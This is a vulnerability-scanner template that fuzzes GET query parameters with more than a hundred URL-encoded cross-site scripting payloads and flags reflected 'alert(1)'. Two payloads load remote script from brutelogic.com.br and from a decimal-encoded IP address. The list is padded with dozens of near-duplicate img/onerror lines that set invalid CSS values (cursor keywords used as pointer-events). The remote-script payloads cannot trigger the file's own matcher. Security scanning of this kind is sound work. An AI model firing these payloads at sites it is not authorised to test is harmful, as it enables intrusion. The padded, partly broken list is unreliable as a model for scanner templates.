id: fuzz-xss-reflection

info:
  name: XSS Reflection Fuzzing
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    This template fuzzes for potential XSS vulnerabilities by injecting encoded XSS payloads into query parameters and checks for reflection in the response body.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
    payloads:
      xss_payloads:
        - "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
        - "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
        - "%3Csvg%20onload%3Dalert%281%29%3E"
        - "%27%3Balert%281%29%2F%2F"
        - "%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
        - "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
        - "%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E"
        - "%3Cbody%20onload%3Dalert%281%29%3E"
        - "%3Cinput%20type%3D%22button%22%20onclick%3D%22alert%281%29%22%3E"
        - "%3Cdiv%20onmouseover%3D%22alert%281%29%22%3Ehover%20me%3C%2Fdiv%3E"
        - "%3Cmarquee%20onstart%3D%22alert%281%29%22%3E"
        - "%3Clayer%20src%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Cobject%20data%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Cembed%20src%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Cbutton%20onclick%3Dalert%281%29%3EClick%20Me%3C%2Fbutton%3E"
        - "%3Cform%20action%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fform%3E"
        - "%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3EClick%20Here%3C%2Fa%3E"
        - "%3Cvideo%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E"
        - "%3Caudio%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E"
        - "%3Ctextarea%20onfocus%3Dalert%281%29%3E%3C%2Ftextarea%3E"
        - "%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%221%3Burl%3Djavascript%3Aalert%281%29%22%3E"
        - "%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert%281%29%22%3E"
        - "%3Cscript%20src%3D%22data%3Atext%2Fjavascript%3Bbase64%2CYWxlcnQoMSk%3D%22%3E%3C%2Fscript%3E"
        - "%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%20onload%3D%22alert%281%29%22%3E%3C%2Fiframe%3E"
        - "%3Cdiv%20style%3D%22background%3Aurl%28javascript%3Aalert%281%29%29%22%3E%3C%2Fdiv%3E"
        - "%3Cinput%20type%3Dtext%20value%3D%22XSS%22%20onfocus%3D%22alert%281%29%22%3E"
        - "%3Cform%20onsubmit%3D%22alert%281%29%22%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E"
        - "%3Cselect%20onchange%3D%22alert%281%29%22%3E%3Coption%3EClick%3C%2Foption%3E%3C%2Fselect%3E"
        - "%3Cbutton%20onmouseenter%3D%22alert%281%29%22%3EHover%20Me%3C%2Fbutton%3E"
        - "%3Cinput%20type%3D%22image%22%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E"
        - "%3Ctable%20background%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Cbody%20background%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Ca%20onmouseover%3D%22alert%281%29%22%3EHover%20Me%3C%2Fa%3E"
        - "%3Cimg%20dynsrc%3D%22javascript%3Aalert%281%29%22%3E"
        - "%3Csvg%3E%3Cset%20attributeName%3D%22onmouseover%22%20to%3D%22alert%281%29%22%2F%3E%3C%2Fsvg%3E"
        - "%3Cimg%20src%3Dx%20onerror%3D%22alert%281%29%22%20style%3D%22width%3A200px%22%3E"
        - "%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%281%29%22%3E"
        - "%3Csvg%3E%3Canimate%20attributeName%3D%22xlink%3Ahref%22%20to%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fsvg%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20width%3D%22100%25%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20height%3D%22100%25%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22display%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22visibility%3Ahidden%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22opacity%3A0%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22position%3Aabsolute%3Btop%3A-9999px%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22z-index%3A-1%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22user-select%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22clip-path%3Acircle%280%25%29%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22filter%3Ablur%285px%29%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22transform%3Ascale%280%29%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22transition%3Aall%201s%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22animation%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22background%3Aurl%28javascript%3Aalert%281%29%29%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22border%3A1px%20solid%20red%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22outline%3A1px%20solid%20red%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22box-shadow%3A0%200%2010px%20red%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22text-shadow%3A0%200%2010px%20red%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22cursor%3Apointer%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22resize%3Aboth%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overflow%3Ahidden%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-behavior%3Asmooth%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-snap-type%3Ay%20mandatory%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-snap-align%3Astart%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-snap-stop%3Aalways%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-margin%3A10px%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scroll-padding%3A10px%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scrollbar-width%3Athin%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scrollbar-color%3Ared%20blue%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22scrollbar-gutter%3Astable%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overscroll-behavior%3Acontain%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overscroll-behavior-block%3Acontain%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overscroll-behavior-inline%3Acontain%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overscroll-behavior-x%3Acontain%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22overscroll-behavior-y%3Acontain%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22touch-action%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22touch-action%3Apan-x%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22touch-action%3Apan-y%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22touch-action%3Amanipulation%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22touch-action%3Aauto%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aauto%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Anone%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3AvisiblePainted%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3AvisibleFill%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3AvisibleStroke%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Apainted%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Afill%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Astroke%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aall%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Abounding-box%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Avisible%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Ainitial%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Ainherit%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aunset%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Arevert%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Adefault%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Acontext-menu%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Ahelp%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aprogress%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Await%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Acell%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Acrosshair%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Atext%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Avertical-text%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aalias%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Acopy%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Amove%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Ano-drop%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Anot-allowed%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aall-scroll%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Acol-resize%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Arow-resize%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3An-resize%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Ae-resize%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3As-resize%22%3E"
        - "%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%20style%3D%22pointer-events%3Aw-resize%22%3E"
        - "%3Ca%20href%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fa%3E"
        - "%3Cmath%3E%3Cbrute%20href%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fmath%3E"
        - "%3Cscript%20src%3D%2F%2Fbrutelogic.com.br%2F1.js%3E"
        - "%3Cscript%20src%3D%2F%2F3334957647%2F1%3E"
    fuzzing:
      - part: query
        type: postfix
        fuzz:
          - "{{xss_payloads}}"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "alert(1)"
